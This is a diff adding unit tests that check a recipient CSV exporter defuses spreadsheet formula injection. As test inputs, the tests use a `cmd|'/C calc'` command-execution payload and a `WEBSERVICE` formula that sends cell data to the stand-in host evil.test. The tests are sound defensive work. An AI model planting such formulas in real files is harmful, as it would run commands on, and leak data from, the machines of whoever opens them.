@@ -76,6 +76,39 @@ describe('buildRecipientCsv', () => {
   it('emits a header-only file for an empty list', () => {
     assert.equal(buildRecipientCsv([]).trim().split('\n').length, 1)
   })
+
+  // CWE-1236. Recipient fields are customer-supplied and the vendor opens this
+  // file in Excel, so a formula here executes on their machine.
+  it('neutralizes every spreadsheet formula prefix', () => {
+    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
+      const csv = buildRecipientCsv([{ first_name: `${prefix}cmd|'/C calc'!A0` }])
+      const row = csv.trim().split('\n')[1]
+      assert.ok(
+        row.includes(`'${prefix}`),
+        `prefix ${JSON.stringify(prefix)} was not quoted: ${row}`
+      )
+      assert.ok(!/(^|,)[=+\-@]/.test(row), `formula still starts a cell: ${row}`)
+    }
+  })
+
+  it('keeps the payload intact while defusing it', () => {
+    const csv = buildRecipientCsv([
+      { first_name: '=WEBSERVICE("http://evil.test/?d="&B2)', last_name: 'Ok' },
+    ])
+    const row = csv.trim().split('\n')[1]
+    // Quoted because of the embedded comma-free quotes, apostrophe-prefixed
+    // because of the '='. Nothing is dropped — we still mail the right name.
+    assert.ok(row.includes('WEBSERVICE'))
+    assert.ok(row.includes(`'=`))
+    assert.ok(row.includes('Ok'))
+  })
+
+  it('leaves ordinary values untouched', () => {
+    const csv = buildRecipientCsv([{ first_name: 'Ann', zip_code: '33601' }])
+    const row = csv.trim().split('\n')[1]
+    assert.ok(row.startsWith('1,Ann,'))
+    assert.ok(!row.includes("'"))
+  })
 })
 
 describe('vendorContactEmail', () => {
